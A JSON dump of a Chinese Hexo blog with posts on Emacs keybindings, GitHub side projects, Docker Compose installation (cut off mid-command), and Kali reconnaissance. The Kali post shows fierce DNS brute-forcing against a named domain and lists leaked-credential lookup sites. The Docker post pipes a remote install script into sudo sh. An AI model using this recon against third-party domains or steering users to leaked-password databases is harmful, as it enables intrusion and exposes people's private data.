窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n搜索和替换\n\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\nTags\n\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n书签\n\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n帮助\n\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n其它\n\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>\n","source":"_posts/Emacs-命令大全.md","raw":"---\ntitle: Emacs 命令大全\ntags: 'Linux'\npermalink: emacs-da-quan\nid: 5\nupdated: '2016-08-05 21:14:03'\ndate: 2016-07-29 02:10:07\n---\n\n\n**emacs命令**是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。\n<!-- more --> \n## # 语法\n\nemacs(选项)(参数)\n\n## #选项\n\n<pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</pre>\n\n## #参数\n\t文件：指定要编辑的文本文件。\n\n## #emacs命令操作大全\n\n基本命令\n\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n编辑\n\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n移动光标\n\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\nBuffer 相关\n\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n拷贝与粘贴\n\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n搜索和替换\n\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\nTags\n\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n书签\n\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n帮助\n\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n其它\n\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>\n","slug":"emacs-da-quan","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym30000002cdon46cgwvtf","content":"<p><strong>emacs命令</strong>是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。<br><a id=\"more\"></a> </p>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"# 语法\"></a># 语法</h2><p>emacs(选项)(参数)</p>\n<h2 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"#选项\"></a>#选项</h2><pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</span></pre>\n\n<h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"#参数\"></a>#参数</h2><pre><code>文件：指定要编辑的文本文件。\n</code></pre><h2 id=\"emacs命令操作大全\"><a href=\"#emacs命令操作大全\" class=\"headerlink\" title=\"#emacs命令操作大全\"></a>#emacs命令操作大全</h2><p>基本命令</p>\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n<p>编辑</p>\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n<p>移动光标</p>\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\n<p>Buffer 相关</p>\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n<p>拷贝与粘贴</p>\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n<p>搜索和替换</p>\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\n<p>Tags</p>\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n<p>书签</p>\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n<p>帮助</p>\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n<p>其它</p>\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>\n","excerpt":"<p><strong>emacs命令</strong>是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。<br>","more":"</p>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"# 语法\"></a># 语法</h2><p>emacs(选项)(参数)</p>\n<h2 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"#选项\"></a>#选项</h2><pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</pre>\n\n<h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"#参数\"></a>#参数</h2><pre><code>文件：指定要编辑的文本文件。\n</code></pre><h2 id=\"emacs命令操作大全\"><a href=\"#emacs命令操作大全\" class=\"headerlink\" title=\"#emacs命令操作大全\"></a>#emacs命令操作大全</h2><p>基本命令</p>\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n<p>编辑</p>\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n<p>移动光标</p>\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\n<p>Buffer 相关</p>\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n<p>拷贝与粘贴</p>\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n<p>搜索和替换</p>\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\n<p>Tags</p>\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n<p>书签</p>\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n<p>帮助</p>\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n<p>其它</p>\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>"},{"title":"Kali系列——信息收集阶段（二）","id":"8","updated":"2016-08-05T20:13:14.000Z","date":"2016-08-01T22:20:17.000Z","_content":"<!-- more --> \n## fierece\n暴力破解dns解析\n```bash\nroot@kali:~# fierce -dns dbstye.net\n\nTrying zone transfer first...\n\nUnsuccessful in zone transfer (it was worth a shot)\nOkay, trying the good old fashioned way... brute force\n\nChecking for wildcard DNS...\nNope. Good.\nNow performing 2280 test(s)...\n```\n应用字典\n\n```bash\nroot@kali:~# fierce -dns dbstye.net -wordlist myWordlist.txt\n```\n\n## 社工库\n部分需翻墙\n\n* http://www.xiumima.com/\n\n* http://cha.hxsec.com/\n\n* http://findmima.com\n\n* http://163.donothackme.club/\n\n* http://www.rallyindonesia.com/","source":"_posts/Kali系列——信息收集阶段（二）.md","raw":"---\ntitle: Kali系列——信息收集阶段（二）\ntags: 'Hack'\npermalink: kalixi-lie-xin-xi-shou-ji-jie-duan-yi\nid: 8\nupdated: '2016-08-05 21:13:14'\ndate: 2016-08-01 23:20:17\n---\n<!-- more --> \n## fierece\n暴力破解dns解析\n```bash\nroot@kali:~# fierce -dns dbstye.net\n\nTrying zone transfer first...\n\nUnsuccessful in zone transfer (it was worth a shot)\nOkay, trying the good old fashioned way... brute force\n\nChecking for wildcard DNS...\nNope. Good.\nNow performing 2280 test(s)...\n```\n应用字典\n\n```bash\nroot@kali:~# fierce -dns dbstye.net -wordlist myWordlist.txt\n```\n\n## 社工库\n部分需翻墙\n\n* http://www.xiumima.com/\n\n* http://cha.hxsec.com/\n\n* http://findmima.com\n\n* http://163.donothackme.club/\n\n* http://www.rallyindonesia.com/","slug":"kalixi-lie-xin-xi-shou-ji-jie-duan-yi","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym30020004cdon8s1nrxgk","content":"<a id=\"more\"></a> \n<h2 id=\"fierece\"><a href=\"#fierece\" class=\"headerlink\" title=\"fierece\"></a>fierece</h2><p>暴力破解dns解析<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net</span></div><div class=\"line\"></div><div class=\"line\">Trying zone transfer first...</div><div class=\"line\"></div><div class=\"line\">Unsuccessful <span class=\"keyword\">in</span> zone transfer (it was worth a shot)</div><div class=\"line\">Okay, trying the good old fashioned way... brute force</div><div class=\"line\"></div><div class=\"line\">Checking <span class=\"keyword\">for</span> wildcard DNS...</div><div class=\"line\">Nope. Good.</div><div class=\"line\">Now performing 2280 <span class=\"built_in\">test</span>(s)...</div></pre></td></tr></table></figure></p>\n<p>应用字典</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net -wordlist myWordlist.txt</span></div></pre></td></tr></table></figure>\n<h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><p>部分需翻墙</p>\n<ul>\n<li><p><a href=\"http://www.xiumima.com/\" target=\"_blank\" rel=\"external\">http://www.xiumima.com/</a></p>\n</li>\n<li><p><a href=\"http://cha.hxsec.com/\" target=\"_blank\" rel=\"external\">http://cha.hxsec.com/</a></p>\n</li>\n<li><p><a href=\"http://findmima.com\" target=\"_blank\" rel=\"external\">http://findmima.com</a></p>\n</li>\n<li><p><a href=\"http://163.donothackme.club/\" target=\"_blank\" rel=\"external\">http://163.donothackme.club/</a></p>\n</li>\n<li><p><a href=\"http://www.rallyindonesia.com/\" target=\"_blank\" rel=\"external\">http://www.rallyindonesia.com/</a></p>\n</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"fierece\"><a href=\"#fierece\" class=\"headerlink\" title=\"fierece\"></a>fierece</h2><p>暴力破解dns解析<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net</span></div><div class=\"line\"></div><div class=\"line\">Trying zone transfer first...</div><div class=\"line\"></div><div class=\"line\">Unsuccessful <span class=\"keyword\">in</span> zone transfer (it was worth a shot)</div><div class=\"line\">Okay, trying the good old fashioned way... brute force</div><div class=\"line\"></div><div class=\"line\">Checking <span class=\"keyword\">for</span> wildcard DNS...</div><div class=\"line\">Nope. Good.</div><div class=\"line\">Now performing 2280 <span class=\"built_in\">test</span>(s)...</div></pre></td></tr></table></figure></p>\n<p>应用字典</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net -wordlist myWordlist.txt</span></div></pre></td></tr></table></figure>\n<h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><p>部分需翻墙</p>\n<ul>\n<li><p><a href=\"http://www.xiumima.com/\">http://www.xiumima.com/</a></p>\n</li>\n<li><p><a href=\"http://cha.hxsec.com/\">http://cha.hxsec.com/</a></p>\n</li>\n<li><p><a href=\"http://findmima.com\">http://findmima.com</a></p>\n</li>\n<li><p><a href=\"http://163.donothackme.club/\">http://163.donothackme.club/</a></p>\n</li>\n<li><p><a href=\"http://www.rallyindonesia.com/\">http://www.rallyindonesia.com/</a></p>\n</li>\n</ul>"},{"title":"Github Follow 及 BaiduBlogTransfer 项目","date":"2016-11-08T01:24:35.000Z","_content":"最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。\n\n用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。\n<!-- more --> \n项目地址：\n\n[点击进入项目](https://github.com/yfgeek/AutoGithub)\n\n\n除此之外，我还整理了只去百度空间的Blogs放到了Github封存。\n\nhttps://github.com/yfgeek/Blog\n\n目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。\n\n[点击进入项目](https://github.com/yfgeek/BaiduBlogTransferer)\n\n百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。\n\n百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。\n\n百度空间被百度关闭了，文章也没有了。\n\n百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。\n\n❤️:3Mac\n                                   \n","source":"_posts/Github Follow 及 BaiduBlogTransfer 项目.md","raw":"---\ntitle: 'Github Follow 及 BaiduBlogTransfer 项目'\ndate: 2016-11-08 01:24:35\ntags: github\ncategories: github\n---\n最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。\n\n用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。\n<!-- more --> \n项目地址：\n\n[点击进入项目](https://github.com/yfgeek/AutoGithub)\n\n\n除此之外，我还整理了只去百度空间的Blogs放到了Github封存。\n\nhttps://github.com/yfgeek/Blog\n\n目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。\n\n[点击进入项目](https://github.com/yfgeek/BaiduBlogTransferer)\n\n百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。\n\n百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。\n\n百度空间被百度关闭了，文章也没有了。\n\n百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。\n\n❤️:3Mac\n                                   \n","slug":"Github Follow 及 BaiduBlogTransfer 项目","published":1,"updated":"2016-11-19T12:09:00.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym300a0007cdonlll89l69","content":"<p>最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。</p>\n<p>用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。<br><a id=\"more\"></a><br>项目地址：</p>\n<p><a href=\"https://github.com/yfgeek/AutoGithub\" target=\"_blank\" rel=\"external\">点击进入项目</a></p>\n<p>除此之外，我还整理了只去百度空间的Blogs放到了Github封存。</p>\n<p><a href=\"https://github.com/yfgeek/Blog\" target=\"_blank\" rel=\"external\">https://github.com/yfgeek/Blog</a></p>\n<p>目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。</p>\n<p><a href=\"https://github.com/yfgeek/BaiduBlogTransferer\" target=\"_blank\" rel=\"external\">点击进入项目</a></p>\n<p>百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。</p>\n<p>百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。</p>\n<p>百度空间被百度关闭了，文章也没有了。</p>\n<p>百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。</p>\n<p>❤️:3Mac</p>\n","excerpt":"<p>最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。</p>\n<p>用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。<br>","more":"<br>项目地址：</p>\n<p><a href=\"https://github.com/yfgeek/AutoGithub\">点击进入项目</a></p>\n<p>除此之外，我还整理了只去百度空间的Blogs放到了Github封存。</p>\n<p><a href=\"https://github.com/yfgeek/Blog\">https://github.com/yfgeek/Blog</a></p>\n<p>目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。</p>\n<p><a href=\"https://github.com/yfgeek/BaiduBlogTransferer\">点击进入项目</a></p>\n<p>百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。</p>\n<p>百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。</p>\n<p>百度空间被百度关闭了，文章也没有了。</p>\n<p>百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。</p>\n<p>❤️:3Mac</p>"},{"title":"Docker Compose—简化复杂应用的利器 ","date":"2016-10-15T18:10:35.000Z","_content":"Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。\n<!-- more --> \n## 1. 安装Docker和Compose\n```bash\n# 当前最新的Docker是1.6.2，Compose为1.2.0\ncurl -s https://get.docker.io/ubuntu/ | sudo sh\nsudo apt-get update\nsudo apt-get install lxc-docker\n# 参考http://docs.docker.com/compose/install/#install-compose\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\n```\n```bash\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\n\napt-get install python-pip python-dev\npip install -U docker-compose\n```\n\n当前最新的Docker是1.6.2，Compose为1.2.0\n```bash\nsudo apt-get update\nsudo apt-get install lxc-docker\n```\n参考 http://docs.docker.com/compose/install/#install-compose\n```bash\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m > /usr/local/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m > /usr/local/bin/docker-compose\n\nchmod +x /usr/local/bin/docker-compose\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\napt-get install python-pip python-dev\npip install -U 